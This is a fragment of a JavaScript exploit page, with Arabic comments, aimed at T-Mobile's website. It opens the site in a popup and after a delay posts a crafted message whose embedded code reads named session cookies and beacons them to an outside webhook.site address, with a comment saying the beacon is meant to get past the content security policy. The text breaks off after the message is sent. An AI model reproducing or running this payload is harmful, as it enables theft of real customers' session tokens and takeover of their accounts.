<script>
    function launchExploit() {
        const status = document.getElementById('status');
        status.innerText = "Status: Opening target...";
        
        // 1. فتح نافذة الهدف
        const victimWin = window.open('https://www.t-mobile.com/', '_blank');

        if (!victimWin) {
            alert("Please enable pop-ups for this exploit to work!");
            return;
        }

        status.innerText = "Status: Injecting in 15 seconds (Waiting for Scripts)...";

        // 2. الانتظار حتى تحميل السكربتات (Splunk/Quantum)
        setTimeout(() => {
            status.innerText = "Status: Sending Malicious String Payload...";

            // صياغة الكود الذي سينفذ داخل سياق T-Mobile
            // لاحظ أننا نستخدم "Image Beacon" لتخطي الـ CSP
            const attackerWebhook = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
            
            const internalCode = `() => { 
                const keys = ['a_token', 'TFPID', 'LPVID', 'TMUT'];
                let leak = document.cookie.split('; ').filter(c => keys.some(k => c.startsWith(k + '='))).join('|');
                new Image().src = '${attackerWebhook}/?leak=' + encodeURIComponent(leak);
                return 'LPExternalWindowClosed';
            }`;

            // تحويل الكائن بالكامل إلى String (JSON)
            const payloadString = JSON.stringify({
                "type": "LPExternalWindowClosed",
                "details": {
                    "toString": internalCode
                },
                "source": "secureStorage"
            });

            // 3. إرسال الـ String
            victimWin.postMessage(payloadString, "*");
